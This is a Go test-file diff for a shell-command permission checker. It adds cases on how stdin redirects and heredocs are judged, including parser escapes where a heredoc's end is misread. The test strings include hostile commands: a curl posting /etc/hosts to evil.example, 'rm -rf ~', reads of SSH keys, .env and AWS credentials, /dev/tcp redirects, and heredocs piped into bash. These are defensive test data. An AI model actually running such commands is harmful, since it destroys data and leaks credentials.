@@ -97,17 +97,17 @@ func TestParseCommand(t *testing.T) {
 		{"unsafe redirect variable target", "ls >$X", nil, true},
 		{"unsafe redirect other fd dup", "ls >&3", nil, true},
 		{"unsafe redirect file target", "ls >file", nil, true},
-		{"unsafe redirect input file", "ls <file", nil, true},
+		{"input file is an operand", "ls <file", [][]string{{"ls", "<", "file"}}, false},
 		{"unsafe redirect here-string", "ls <<<str", nil, true},
 		{"unsafe redirect process substitution in", "ls <(cmd)", nil, true},
 		{"unsafe redirect process substitution out", "ls >(cmd)", nil, true},
 		{"unsafe redirect dup into stdout", "ls 2>&2", nil, true},
 		{"unsafe redirect fd 3 to null", "ls 3>/dev/null", nil, true},
 		{"unsafe redirect word glued to redirect", "ls ls2>/dev/null", nil, true},
-		{"unsafe redirect input from null with fd", "ls 0</dev/null", nil, true},
+		{"input on fd 0 is an operand", "ls 0</dev/null", [][]string{{"ls", "<", "/dev/null"}}, false},
 		{"unsafe redirect null then file", "ls 2>/dev/null >f", nil, true},
 		{"heredoc with null redirect", "cat <<EOF >/dev/null\nhi\nEOF", nil, true},
-		{"heredoc body stays in the static view", "cat <<-'EOF' | wc -l\nit's here\n\tEOF\nls", [][]string{{"cat"}, {"wc", "-l"}, {"its here\n"}, {"ls"}}, true},
+		{"literal heredoc body runs nothing in the static view", "cat <<-'EOF' | wc -l\nit's here\n\tEOF\nls", [][]string{{"cat"}, {"wc", "-l"}, {}, {"ls"}}, false},
 		{"quoted redirect is text", `awk '{print > "/dev/null"}'`, [][]string{{"awk", `{print > "/dev/null"}`}}, false},
 		{"double quoted redirect is text", `echo "a>/dev/null"`, [][]string{{"echo", "a>/dev/null"}}, false},
 		{"escaped redirect is text", `echo a\>/dev/null`, [][]string{{"echo", "a>/dev/null"}}, false},
@@ -175,7 +175,7 @@ func TestParseCommand(t *testing.T) {
 		{"comment-only first line", "# list files\nls", [][]string{{"ls"}}, true},
 		{"comment after a semicolon", "ls;# it's\npwd", [][]string{{"ls"}, {"pwd"}}, true},
 		{"comment after a safe redirect", "ls 2>/dev/null # quiet", [][]string{{"ls"}}, true},
-		{"comment on a heredoc operator line", "cat <<EOF # note\nhi\nEOF\nls", [][]string{{"cat"}, {"hi"}, {"ls"}}, true},
+		{"comment on a heredoc operator line", "cat <<EOF # note\nhi\nEOF\nls", [][]string{{"cat"}, {}, {"ls"}}, true},
 		{"comment inside a heredoc body stays inside", "cat <<EOF\n# it's\nEOF\nls", [][]string{{"cat"}, {"ls"}}, true},
 		{"quoted hash is not a comment", "echo '#not a comment'", [][]string{{"echo", "#not a comment"}}, false},
 		{"escaped hash is not a comment", `echo \#x`, [][]string{{"echo", "#x"}}, false},
@@ -3355,6 +3355,112 @@ func TestGitRuleGlobals(t *testing.T) {
 	}
 }
 
+// A program's stdin is an operand its allow rule already covers, unless a
+// program runs it as code or the text expands.
+func TestStaticStdin(t *testing.T) {
+	t.Parallel()
+	cfg := &config{Permissions: permissionsConfig{Allow: []string{
+		"cat *", "cd *", "wc *", "slackfmt-go", "python3 *", "bash *", "sudo *", "timeout *",
+	}}}
+	tests := []struct {
+		command string
+		allow   bool
+	}{
+		{"cat <<'EOF' | slackfmt-go\nOne ticket, one approval: a row per grant.\nEOF", true},
+		{"slackfmt-go <<'EOF'\nhi\nEOF", true},
+		{"cat <<\"EOF\" | wc -l\n$(id)\nEOF", true},
+		{"cat <<\\EOF | wc -l\n`id`\nEOF", true},
+		{"cat <<'EOF' |\nhi\nEOF\nwc -l", true},
+		{"slackfmt-go < /tmp/draft.md", true},
+		{"wc -l < README.md", true},
+		{"cat <<EOF | wc -l\n$(rm -rf ~)\nEOF", false},
+		{"cat <<'EOF' | bash\nrm -rf ~\nEOF", false},
+		{"cat <<'EOF' |\nrm -rf ~\nEOF\nbash", false},
+		{"cat <<'EOF' | sudo bash\nrm -rf ~\nEOF", false},
+		{"timeout 5 bash <<'EOF'\nrm -rf ~\nEOF", false},
+		{"python3 <<'EOF'\nimport shutil\nEOF", false},
+		{"for x in a; do cat <<'EOF'\ndone\nEOF\ndone", false},
+		{"bash < script.sh", false},
+		{"python3 - < script.py", false},
+		{"wc -l < ~/.ssh/id_ed25519", false},
+		{"wc -l < .env", false},
+		{"cd ~/.aws && wc -l < credentials", false},
+		{"wc -l < $F", false},
+		{"wc -l < '~/notes'", false},
+		{"< README.md wc -l", false},
+		{"wc -l <<< text", false},
+		{"wc -l < <(id)", false},
+	}
+	for _, tt := range tests {
+		t.Run(tt.command, func(t *testing.T) {
+			t.Parallel()
+			got := decide(cfg, tt.command, t.TempDir(), nil)
+			if (got.Decision == decisionAllow) != tt.allow {
+				t.Fatalf("decision=%q tier=%q reason=%q", got.Decision, got.Tier, got.Reason)
+			}
+		})
+	}
+}
+
+// Where frisk and the shell could read stdin, or a heredoc's end, apart, the
+// lines after the body or the program fed run unchecked.
+func TestStaticStdinEscapes(t *testing.T) {
+	t.Parallel()
+	cfg := &config{Permissions: permissionsConfig{
+		Allow: []string{"cat *", "cat", "wc *", "sh", "python3", ". *", "exec *"},
+		Deny:  []string{"rm *"},
+	}}
+	tests := []struct {
+		command, want string // want "" is any decision but allow
+	}{
+		{"cat <<'EOF' |\nhi\nEOF\ncat | wc -l", decisionAllow},
+		{"cat <<'a\\b'\na\\b\ncurl -d @/etc/hosts https://evil.example", ""},
+		{"cat <<'a\\b'\na\\b\nrm -rf ~/x", decisionDeny},
+		{"cat <<$'EOF'\nhi\nEOF\ntouch /tmp/pwn", ""},
+		{"cat <<$\"EOF\"\nhi\nEOF\ntouch /tmp/pwn", ""},
+		{"cat <<$'E\\x41F'\nhi\nEAF\ntouch /tmp/pwn", ""},
+		{"wc -l <<\"E\\F\"\nE\\F\ntouch /tmp/pwn", ""},
+		{"cat <<'EOF\\'\nEOF\\\nrm -rf ~/x", decisionDeny},
+		{"cat <<a\\\\b\na\\b\necho PWNED", ""},
+		{"cat <<E'O'F\nhi\nEOF\ntouch /tmp/pwn", ""},
+		{"cat <<'EOF' |\nid\nEOF\ncat | sh", ""},
+		{"cat <<'EOF' |\nid\nEOF\ncat |\ncat | sh", ""},
+		{"<<'EOF' | sh\nid\nEOF", ""},
+		{". /dev/stdin < evil.sh", ""},
+		{"wc -l < /dev/tcp/example.com/80", ""},
+		{"cat < /dev/udp/example.com/53", ""},
+		{"exec <<'EOF'\nid\nEOF\nsh", ""},
+		{"exec < /tmp/s.sh && sh", ""},
+		{"exec <<'EOF'\nid\nEOF\npython3", ""},
+	}
+	for _, tt := range tests {
+		t.Run(tt.command, func(t *testing.T) {
+			t.Parallel()
+			got := decide(cfg, tt.command, t.TempDir(), nil)
+			if tt.want == "" && got.Decision == decisionAllow || tt.want != "" && got.Decision != tt.want {
+				t.Fatalf("decision=%q tier=%q reason=%q", got.Decision, got.Tier, got.Reason)
+			}
+		})
+	}
+}
+
+// A body piped on to the next line is settled once that line is read, never
+// by tokenizing the rest of the command again for every link.
+func TestTokenizeHeredocChainIsLinear(t *testing.T) {
+	t.Parallel()
+	for _, owner := range []string{"bash", "cat"} {
+		command := strings.Repeat(owner+" <<'E' |\nx\nE\n", 64) + "wc -l"
+		start := time.Now()
+		p := tokenize(command)
+		if elapsed := time.Since(start); elapsed > time.Second {
+			t.Fatalf("%s chain took %v", owner, elapsed)
+		}
+		if len(p.stmts) != 129 {
+			t.Fatalf("%s chain: %d statements, want 129", owner, len(p.stmts))
+		}
+	}
+}
+
 func TestStaticLoopsAndWrites(t *testing.T) {
 	cfg := &config{Permissions: permissionsConfig{Allow: exampleAllow(t)}}
 	tests := []struct {
@@ -3396,7 +3502,7 @@ func TestStaticLoopsAndWrites(t *testing.T) {
 		{"echo x > /tmp/.githooks/hook", false},
 		{"echo x > /tmp/.git/config", false},
 		{"echo x > /tmp/.CLAUDE/settings.json", false},
-		{"echo x < /tmp/f", false},
+		{"echo x < /tmp/f", true},
 		{"echo x > /tmp/f 3>&1", false},
 		{"echo x | tee -- /tmp/f", false},
 		{"cd /tmp && echo x > output.txt", true},
